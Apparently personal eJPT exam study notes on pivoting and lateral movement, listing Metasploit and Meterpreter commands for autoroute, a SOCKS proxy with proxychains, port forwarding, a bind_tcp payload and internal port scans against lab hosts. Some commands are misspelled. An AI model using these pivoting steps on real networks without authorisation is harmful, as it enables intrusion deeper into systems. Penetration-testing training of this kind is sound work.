## Pivoting and lateral movement

[eJPT - Exam Notes Index](https://github.com/sedici-gith/eJPT/tree/main)

### Metaslpoit (Meterpreter)
```
shell
/bin/bash -i
ifconfig
```
This command aims to discover another subnet accessibile only by the target machine.

### Meterpreter

After obtaining a Meterpreter session on the target system, we can access to another system connected to the first, using:
```
meterpreter> run autotoroute -s 10.10.26.0/20
```
and then:
```
metasploit> use /auxiliary/server/socks_proxy
root> proxychains nmap demo1.ine.local
```
The first one works only within the Metasploit session, the second one works system wide.
It is important to correctly identify the network needed to configure autoroute.

We can establish a general port forwarding mechanism to facilitate communication and access to other tools on the target machine.
```
portfwd add -l 1234 -p 80 -r 10.10.10.127
db_nmap -sS -sV -p 1234 localhost
```
```
windows/meterpreter/bind_tcp
```
To exploit the second machine we need to use th bind_tcp method beaches we cannot establish a direct connection to the target.

### Metasploit
```
use auxiliary/scanner/portscan/tcp
```
It’s used to scan TCP ports on a target machine located on an unreachable subnet, without the assistance of the first target machine.
```
search udp_sweep
```
Same for UDP.
